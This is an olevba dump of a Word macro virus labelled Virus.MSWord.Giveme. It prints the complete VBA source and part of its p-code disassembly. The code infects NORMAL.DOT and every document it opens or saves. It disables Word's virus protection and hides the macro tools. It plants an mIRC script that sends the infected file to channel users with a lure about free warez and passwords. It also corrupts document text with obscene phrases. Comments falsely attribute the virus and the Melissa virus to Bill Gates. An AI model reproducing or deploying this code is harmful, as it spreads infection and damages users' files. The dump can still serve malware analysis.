olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Giveme
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Giveme - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Microsoft.bas 
in file: Virus.MSWord.Giveme - OLE stream: 'Macros/VBA/Microsoft'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Macro virus made by Microsoft Company.
'Author: Bill Gates (yeah, it's really me!).
'
'Bill Gates have to confess:
'"I was the one who did the Melissa virus! I'm sorry for the trouble I may have caused you."
'"The guy David Smith is innocent!"

Sub SetMeUp()
Dim Path As String, D1 As String, D2 As String, D3 As String, _
D4 As String, D5 As String, D6 As String, Docu As String, _
Hell As String

'Stealth
Call HideMe

On Error GoTo Aha
Close #1

'Check if mIRC worm is installed
Open "c:\go.sex" For Input As #1
Input #1, Path
Close #1
If Path = "No fucking mIRC!" Then GoTo WhatTheHell
Open Path & "giveme.doc" For Input As #1
Close #1
Open Path & "script.ini" For Input As #1
Input #1, D1, D2, D3, D4, D5, D6
Close #1
If D1 <> "[script]" Or D2 <> "n0=on 1:JOIN:#:{" Or D3 <> "n1=/msg $nick Hi $nick! Please read the file I'm sending to you. You will get warez" Or D4 <> "mp3 and XXX passwords FOR FREE!" Or D5 <> "n2=/send $nick " & Path & "giveme.doc" Or D6 <> "n3=}" Then GoTo Aha
'MsgBox "mIRC worm already installed.", vbInformation
Exit Sub

Aha:
Resume GoGo

GoGo:
On Error GoTo WhatTheHell
Close #1
StatusBar = "Loading..."

If LCase(Dir("c:\mirc\mirc32.exe")) = "mirc32.exe" Then
    Path = "c:\mirc\"
Else
    With Application.FileSearch
        .NewSearch
        .LookIn = "c:\"
        .SearchSubFolders = True
        .FileName = "mirc32.exe"
        .MatchTextExactly = True
        .FileType = msoFileTypeAllFiles
        .Execute
        
        Hell = 0
        'No fucking mIRC!
        If .FoundFiles.Count = 0 Then Hell = 1
        If Dir(.FoundFiles(1)) = "" Then Hell = 1
        If LCase(Right(.FoundFiles(1), 10)) <> "mirc32.exe" Then Hell = 1
        If Left(Right(.FoundFiles(1), 11), 1) <> "\" Then Hell = 1
        
        If Hell = 1 Then
            'Stupid idiot! Doesn't everyone have mIRC?
            Path = "No fucking mIRC!"
            GoTo SavePath
        Else
            'mIRC path
            Path = Left(.FoundFiles(1), Len(.FoundFiles(1)) - 10)
        End If
    End With
End If

Docu = ActiveDocument.FullName

'No fucking write-protect!
If LCase(Dir(Path & "giveme.doc")) = "giveme.doc" Then _
SetAttr Path & "giveme.doc", vbNormal
'Copy infected file to mIRC directory
ActiveDocument.SaveAs Path & "giveme.doc", wdFormatTemplate

'No fucking write-protect!
SetAttr Docu, vbNormal
'Save the document
ActiveDocument.SaveAs Docu, wdFormatTemplate

'Write-protected files sucks so hard!
If LCase(Dir(Path & "script.ini")) = "script.ini" Then _
SetAttr Path & "script.ini", vbNormal
'Create mIRC worm
Open Path & "script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#:{"
Print #1, "n1=/msg $nick Hi $nick! Please read the file I'm sending to you. You will get warez, mp3 and XXX passwords FOR FREE!"
Print #1, "n2=/send $nick " & Path & "giveme.doc"
Print #1, "n3=}"
Close #1

SavePath:
'Yep, I still hate those fucking write-protected files!
If LCase(Dir("c:\go.sex")) = "go.sex" Then _
SetAttr "c:\go.sex", vbNormal
'Save the mIRC path
Open "c:\go.sex" For Output As #1
Print #1, Path
Close #1

Exit Sub

WhatTheHell:
'MsgBox "No mIRC found.", vbInformation
Close #1
Exit Sub
End Sub

Sub HideMe()
On Error Resume Next

'Stealth
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros = 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.SavePropertiesPrompt = False
Options.ConfirmConversions = False
SetAttr NormalTemplate.FullName, vbNormal
End Sub

Sub AutoExec()
'Stealth
Call HideMe
End Sub

Sub AutoOpen()
'Stealth
Call HideMe

'No bugs in Bill's code! No, no...
On Error Resume Next

'Even if I hate write-protected files, I'm not gonna infect them
If Not GetAttr(ActiveDocument.FullName) = vbNormal And _
Not GetAttr(ActiveDocument.FullName) = vbArchive Then Exit Sub

'Document check
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
    'Save the document as a template
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
    'Call infection routine
    Call ASDF

    'Install mIRC worm
    Call SetMeUp
End If
End Sub

Sub FileSaveAs()
'Stealth
Call HideMe

'No bugs in Bill's code! No, no...
On Error Resume Next

'Show Save As dialog box
Dialogs(wdDialogFileSaveAs).Show

'Document check
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
    'Only save the document if the user doesn't press the stupid Cancel key
    If InStr(1, ActiveDocument.FullName, "ument", vbTextCompare) <= 0 Then
        'Save the document as a template
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
        'Call infection routine
        Call ASDF
    End If
End If
End Sub

Sub FileSave()
'Stealth
Call HideMe

'No bugs in Bill's code! No, no...
On Error Resume Next

'Document check
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
    'Call infection routine
    Call ASDF
End If
End Sub

Sub ASDF()
'Stealth
Call HideMe

'No bugs in Bill's code! No, no...
On Error Resume Next

'Check if NORMAL.DOT is infected
Billy = 0
YeahYeah = WordBasic.CountMacros(0, 0)
For vir = 1 To YeahYeah
    If WordBasic.[MacroName$](vir, 0, 0) = "Microsoft" Then
        'NORMAL.DOT is already infected!
        Billy = 666
    End If
Next vir

'Infecting NORMAL.DOT
If Not Billy = 666 Then
    'MsgBox "Infecting NORMAL.DOT!", vbInformation
    SetAttr NormalTemplate.FullName, vbNormal
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Microsoft", wdOrganizerObjectProjectItems
    NormalTemplate.Save
End If

'Check if the document is infected
Billy = 0
YeahYeah = WordBasic.CountMacros(1, 0)
For vir = 1 To YeahYeah
    If WordBasic.[MacroName$](vir, 1, 0) = "Microsoft" Then
        'Document is already infected!
        Billy = 666
    End If
Next vir

'Infecting the document
If Not Billy = 666 Then
    'MsgBox "Infecting your file...", vbInformation
    Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Microsoft", wdOrganizerObjectProjectItems
End If

'Payload
Call PayMe

'Save the document
ActiveDocument.Save
End Sub

Function yx() As String
Dim xy As Integer

'Stealth
Call HideMe

Randomize
xy = Int(Rnd * 20) + 1
If xy = 1 Then yx = "oh yeah! "
If xy = 2 Then yx = "yeah yeah! "
If xy = 3 Then yx = "what the hell! "
If xy = 4 Then yx = "don't do that to me! "
If xy = 5 Then yx = "I love you! "
If xy = 6 Then yx = "shit happens all the time! "
If xy = 7 Then yx = "oh no - not again! "
If xy = 8 Then yx = "fucking lamer! "
If xy = 9 Then yx = "please fuck with me! "
If xy = 10 Then yx = "fuck you! "
If xy = 11 Then yx = "suck my ass! "
If xy = 12 Then yx = "yep - it sucks! "
If xy = 13 Then yx = "who am I? "
If xy = 14 Then yx = "why am I doing this? "
If xy = 15 Then yx = "is this really happening to me? "
If xy = 16 Then yx = "I know I'm a loser! "
If xy = 17 Then yx = "please don't kill me, I'm not a virus! "
If xy = 18 Then yx = "ha ha - funny, isn't it?! "
If xy = 19 Then yx = "ugh ugh! "
If xy = 20 Then yx = "Am I a virus? No, I'm Bill Gates and I live in your PC! "
End Function

Sub PayMe()
Dim BG As Integer

'Stealth
Call HideMe

Randomize
BG = Int(Rnd * 10) + 1
If BG < 1 Or BG > 1 Then Exit Sub

Do While InStr(1, ActiveDocument.Content, ". ") > 0
    Selection.WholeStory
    Selection.Find.Text = ". "
    
    Selection.Find.Replacement.Text = ", " & yx
    Selection.Find.Execute Replace:=wdReplaceOne
Loop

Selection.HomeKey Unit:=wdStory, Extend:=wdMove
End Sub

Sub Stealth()
'Stealth
Call HideMe

MsgBox "Can't find necessary files.", vbCritical
End Sub

Sub ToolsMacro()
Call Stealth
End Sub

Sub ToolsCustomize()
Call Stealth
End Sub

Sub FileTemplates()
Call Stealth
End Sub

Sub ViewVBCode()
Call Stealth
End Sub

Sub FormatStyle()
Call Stealth
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Giveme
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/Microsoft - 15967 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0026 "Macro virus made by Microsoft Company."
' Line #1:
' 	QuoteRem 0x0000 0x002B "Author: Bill Gates (yeah, it's really me!)."
' Line #2:
' 	QuoteRem 0x0000 0x0000 ""
' Line #3:
' 	QuoteRem 0x0000 0x001B "Bill Gates have to confess:"
' Line #4:
' 	QuoteRem 0x0000 0x005B ""I was the one who did the Melissa virus! I'm sorry for the trouble I may have caused you.""
' Line #5:
' 	QuoteRem 0x0000 0x0022 ""The guy David Smith is innocent!""
' Line #6:
' Line #7:
' 	FuncDefn (Sub SetMeUp())
' Line #8:
' 	LineCont 0x0008 11 00 00 00 21 00 00 00
' 	Dim 
' 	VarDefn Path (As String)
' 	VarDefn D1 (As String)
' 	VarDefn D2 (As String)
' 	VarDefn D3 (As String)
' 	VarDefn D4 (As String)
' 	VarDefn D5 (As String)
' 	VarDefn D6 (As String)
' 	VarDefn Docu (As String)
' 	VarDefn Hell (As String)
' Line #9:
' Line #10:
' 	QuoteRem 0x0000 0x0007 "Stealth"
' Line #11:
' 	ArgsCall (Call) HideMe 0x0000 
' Line #12:
' Line #13:
' 	OnError Aha 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #15:
' Line #16:
' 	QuoteRem 0x0000 0x001F "Check if mIRC worm is installed"
' Line #17:
' 	LitStr 0x0009 "c:\go.sex"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld Path 
' 	InputItem 
' 	InputDone 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #20:
' 	Ld Path 
' 	LitStr 0x0010 "No fucking mIRC!"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo WhatTheHell 
' 	EndIf 
' Line #21:
' 	Ld Path 
' 	LitStr 0x000A "giveme.doc"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #23:
' 	Ld Path 
' 	LitStr 0x000A "script.ini"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld D1 
' 	InputItem 
' 	Ld D2 
' 	InputItem 
' 	Ld D3 
' 	InputItem 
' 	Ld D4 
' 	InputItem 
' 	Ld D5 
' 	InputItem 
' 	Ld D6 
' 	InputItem 
' 	InputDone 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #26:
' 	Ld D1 
' 	LitStr 0x0008 "[script]"
' 	Ne 
' 	Ld D2 
' 	LitStr 0x0010 "n0=on 1:JOIN:#:{"
' 	Ne 
' 	Or 
' 	Ld D3 
' 	LitStr 0x0053 "n1=/msg $nick Hi $nick! Please read the file I'm sending to you. You will get warez"
' 	Ne 
' 	Or 
' 	Ld D4 
' 	LitStr 0x001F "mp3 and XXX passwords FOR FREE!"
' 	Ne 
' 	Or 
' 	Ld D5 
' 	LitStr 0x000F "n2=/send $nick "
' 	Ld Path 
' 	Concat 
' 	LitStr 0x000A "giveme.doc"
' 	Concat 
' 	Ne 
' 	Or 
' 	Ld D6 
' 	LitStr 0x0004 "n3=}"
' 	Ne 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo Aha 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0034 "MsgBox "mIRC worm already installed.", vbInformation"
' Line #28:
' 	ExitSub 
' Line #29:
' Line #30:
' 	Label Aha 
' Line #31:
' 	Resume GoGo 
' Line #32:
' Line #33:
' 	Label GoGo 
' Line #34:
' 	OnError WhatTheHell 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #36:
' 	LitStr 0x000A "Loading..."
' 	St StatusBar 
' Line #37:
' Line #38:
' 	LitStr 0x0012 "c:\mirc\mirc32.exe"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000A "mirc32.exe"
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x0008 "c:\mirc\"
' 	St Path 
' Line #40:
' 	ElseBlock 
' Line #41:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #42:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #43:
' 	LitStr 0x0003 "c:\"
' 	MemStWith LookIn 
' Line #44:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #45:
' 	LitStr 0x000A "mirc32.exe"
' 	MemStWith FileName 
' Line #46:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #47:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #48:
' 	ArgsMemCallWith Execute 0x0000 
' Line #49:
' Line #50:
' 	LitDI2 0x0000 
' 	St Hell 
' Line #51:
' 	QuoteRem 0x0008 0x0010 "No fucking mIRC!"
' Line #52:
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Hell 
' 	EndIf 
' Line #53:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Hell 
' 	EndIf 
' Line #54:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Right 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000A "mirc32.exe"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Hell 
' 	EndIf 
' Line #55:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	LitDI2 0x000B 
' 	ArgsLd Right 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Hell 
' 	EndIf 
' Line #56:
' Line #57:
' 	Ld Hell 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #58:
' 	QuoteRem 0x000C 0x0029 "Stupid idiot! Doesn't everyone have mIRC?"
' Line #59:
' 	LitStr 0x0010 "No fucking mIRC!"
' 	St Path 
' Line #60:
' 	GoTo SavePath 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	QuoteRem 0x000C 0x0009 "mIRC path"
' Line #63:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	FnLen 
' 	LitDI2 0x000A 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St Path 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	EndWith 
' Line #66:
' 	EndIfBlock 
' Line #67:
' Line #68:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St Docu 
' Line #69:
' Line #70:
' 	QuoteRem 0x0000 0x0019 "No fucking write-protect!"
' Line #71:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld Path 
' 	LitStr 0x000A "giveme.doc"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000A "giveme.doc"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Path 
' 	LitStr 0x000A "giveme.doc"
' 	Concat 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #72:
' 	QuoteRem 0x0000 0x0024 "Copy infected file to mIRC directory"
' Line #73:
' 	Ld Path 
' 	LitStr 0x000A "giveme.doc"
' 	Concat 
' 	Ld wdFormatTemplate 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #74:
' Line #75:
' 	QuoteRem 0x0000 0x0019 "No fucking write-protect!"
' Line #76:
' 	Ld Docu 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #77:
' 	QuoteRem 0x0000 0x0011 "Save the document"
' Line #78:
' 	Ld Docu 
' 	Ld wdFormatTemplate 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #79:
' Line #80:
' 	QuoteRem 0x0000 0x0024 "Write-protected files sucks so hard!"
' Line #81:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld Path 
' 	LitStr 0x000A "script.ini"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000A "script.ini"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Path 
' 	LitStr 0x000A "script.ini"
' 	Concat 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #82:
' 	QuoteRem 0x0000 0x0010 "Create mIRC worm"
' Line #83:
' 	Ld Path 
' 	LitStr 0x000A "script.ini"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "[script]"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "n0=on 1:JOIN:#:{"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0074 "n1=/msg $nick Hi $nick! Please read the file I'm sending to you. You will get warez, mp3 and XXX passwords FOR FREE!"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "n2=/send $nick "
' 	Ld Path 
' 	Concat 
' 	LitStr 0x000A "giveme.doc"
' 	Concat 
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "n3=}"
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #90:
' Line #91:
' 	Label SavePath 
' Line #92:
' 	QuoteRem 0x0000 0x0036 "Yep, I still hate those fucking write-protected files!"
' Line #93:
' 	LineCont 0x0004 0B 00 00 00
' 	LitStr 0x0009 "c:\go.sex"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0006 "go.sex"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "c:\go.sex"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #94:
' 	QuoteRem 0x0000 0x0012 "Save the mIRC path"
' Line #95:
' 	LitStr 0x0009 "c:\go.sex"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Path 
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #98:
' Line #99:
' 	ExitSub 
' Line #100:
' Line #101:
' 	Label WhatTheHell 
' Line #102:
' 	QuoteRem 0x0000 0x0026 "MsgBox "No mIRC found.", vbInformation"
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #104:
' 	ExitSub 
' Line #105:
' 	EndSub 
' Line #106:
' Line #107:
' 	FuncDefn (Sub HideMe())
' Line #108:
' 	OnError (Resume Next) 
' Line #109:
' Line #110:
' 	QuoteRem 0x0000 0x0007 "Stealth"
' Line #111:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #112:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #113:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	MemSt DisableAutoMacros 
' Line #114:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #115:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #116:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #117:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #118:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #119:
' 	EndSub 
' Line #120:
' Line #121:
' 	FuncDefn (Sub AutoExec())
' Line #122:
' 	QuoteRem 0x0000 0x0007 "Stealth"
' Line #123:
' 	ArgsCall (Call) HideMe 0x0000 
' Line #124:
' 	EndSub 
' Line #125:
' Line #126:
' 	FuncDefn (Sub AutoOpen())
' Line #127:
' 	QuoteRem 0x0000 0x0007 "Stealth"
' Line #128:
' 	ArgsCall (Call) HideMe 0x0000 
' Line #129:
' Line #130:
' 	QuoteRem 0x0000 0x0021 "No bugs in Bill's code! No, no..."
' Line #131:
' 	OnError (Resume Next) 
' Line #132:
' Line #133:
' 	QuoteRem 0x0000 0x003F "Even if I hate write-protected files, I'm not gonna infect them"
' Line #134:
' 	LineCont 0x0004 0B 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbNormal 
' 	Eq 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Eq 
' 	Not 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #135:
' Line #136:
' 	QuoteRem 0x0000 0x000E "Document check"
' Line #137:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #138:
' 	QuoteRem 0x0004 0x001F "Save the document as a template"
' Line #139:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #140:
' 	QuoteRem 0x0004 0x0016 "Call infection routine"
' Line #141:
' 	ArgsCall (Call) ASDF 0x0000 
' Line #142:
' Line #143:
' 	QuoteRem 0x0004 0x0011 "Install mIRC worm"
' Line #144:
' 	ArgsCall (Call) SetMeUp 0x0000 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	EndSub 
' Line #147:
' Line #148:
' 	FuncDefn (Sub FileSaveAs())
' Line #149:
' 	QuoteRem 0x0000 0x0007 "Stealth"
' Line #150:
' 	ArgsCall (Call) HideMe 0x0000 
' Line #151:
' Line #152:
' 	QuoteRem 0x0000 0x0021 "No bugs in Bill's code! No, no..."
' Line #153:
' 	OnError (Resume Next) 
' Line #154:
' Line #155:
' 	QuoteRem 0x0000 0x0017 "Show Save As dialog box"
' Line #156:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #157:
' Line #158:
' 	QuoteRem 0x0000 0x000E "Document check"
' Line #159:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #160:
' 	QuoteRem 0x0004 0x0046 "Only save the document if the user doesn't press the stupid Cancel key"
' Line #161:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0005 "ument"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Le 
' 	IfBlock 
' Line #162:
' 	QuoteRem 0x0008 0x001F "Save the document as a template"
' Line #163:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #164:
' 	QuoteRem 0x0008 0x0016 "Call infection routine"
' Line #165:
' 	ArgsCall (Call) ASDF 0x0000 
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	EndIfBlock 
' Line #168:
' 	EndSub 
' Line #169:
' Line #170:
' 	FuncDefn (Sub FileSave())
' Line #171:
' 	QuoteRem 0x0000 0x0007 "Stealth"
' Line #172:
' 	ArgsCall (Call) HideMe 0x0000 
' Line #173:
' Line #174:
' 	QuoteRem 0x0000 0x0021 "No bugs in Bill's code! No, no..."
' Line #175:
' 	OnError (Resume Next) 
' Line #176:
' Line #177:
' 	QuoteRem 0x0000 0x000E "Document check"
' Line #178:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #179:
' 	QuoteRem 0x0004 0x0016 "Call infection routine"
' Line #180:
' 	ArgsCall (Call) ASDF 0x0000 
' Line #181:
' 	EndIfBlock 
' Line #182:
' 	EndSub 
' Line #183:
' Line #184:
' 	FuncDefn (Sub ASDF())
' Line #185:
' 	QuoteRem 0x0000 0x0007 "Stealth"
' Line #186:
' 	ArgsCall (Call) HideMe 0x0000 
' Line #187:
' Line #188:
' 	QuoteRem 0x0000 0x0021 "No bugs in Bill's code! No, no..."
' Line #189:
' 	OnError (Resume Next) 
' Line #190:
' Line #191:
' 	QuoteRem 0x0000 0x001F "Check if NORMAL.DOT is infected"
' Line #192:
' 	LitDI2 0x0000 
' 	St Billy 
' Line #193:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St YeahYeah 
' Line #194:
' 	StartForVariable 
' 	Ld vir 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld YeahYeah 
' 	For 
' Line #195:
' 	Ld vir 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "Microsoft"
' 	Eq 
' 	IfBlock 
' Line #196:
' 	QuoteRem 0x0008 0x001F "NORMAL.DOT is already infected!"
' Line #197:
' 	LitDI2 0x029A 
' 	St Billy 
' Line #198:
' 	EndIfBlock 
' Line #199:
' 	StartForVariable 
' 	Ld vir 
' 	EndForVariable 
' 	NextVar 
' Line #200:
' Line #201:
' 	QuoteRem 0x0000 0x0014 "Infecting NORMAL.DOT"
' Line #202:
' 	Ld Billy 
' 	LitDI2 0x029A 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #203:
' 	QuoteRem 0x0004 0x002D "MsgBox "Infecting NORMAL.DOT!", vbInformation"
' Line #204:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #205:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x0009 "Microsoft"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #206:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #207:
' 	EndIfBlock 
' Line #208:
' Line #209:
' 	QuoteRem 0x0000 0x0021 "Check if the document is infected"
' Line #210:
' 	LitDI2 0x0000 
' 	St Billy 
' Line #211:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St YeahYeah 
' Line #212:
' 	StartForVariable 
' 	Ld vir 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld YeahYeah 
' 	For 
' Line #213:
' 	Ld vir 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "Microsoft"
' 	Eq 
' 	IfBlock 
' Line #214:
' 	QuoteRem 0x0008 0x001D "Document is already infected!"
' Line #215:
' 	LitDI2 0x029A 
' 	St Billy 
' Line #216:
' 	EndIfBlock 
' Line #217:
